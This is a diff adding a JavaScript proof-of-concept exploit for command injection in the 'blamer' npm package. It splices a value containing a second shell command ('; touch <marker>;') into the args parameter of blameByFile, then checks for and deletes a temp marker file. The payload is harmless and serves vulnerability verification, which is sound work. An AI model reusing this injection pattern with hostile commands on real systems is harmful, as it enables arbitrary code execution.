@@ -1,0 +1,28 @@
+```javascript
+// Exploit for command injection in blamer (git.js): the `args` parameter is
+// concatenated unsanitized into a shell string passed to child_process.exec.
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+const Blamer = require("./node_modules/blamer");
+
+const marker = path.join(os.tmpdir(), "blamer_pwned_" + Date.now() + ".txt");
+
+const blamer = new Blamer("git");
+
+// The second argument to blameByFile is spliced directly into:
+//   exec('git blame ' + args + ' ' + realFile, ...)
+// allowing arbitrary shell command injection.
+const maliciousArgs = `-w; touch ${marker}; echo`;
+
+blamer.blameByFile(__filename, maliciousArgs)
+  .catch(() => {}) // parsing of the injected/empty output may throw; irrelevant to the exploit
+  .then(() => {
+    if (fs.existsSync(marker)) {
+      console.log("VULNERABLE: command injection executed, marker file created at " + marker);
+      fs.unlinkSync(marker);
+    } else {
+      console.log("Exploit did not trigger (marker file missing).");
+    }
+  });
+```
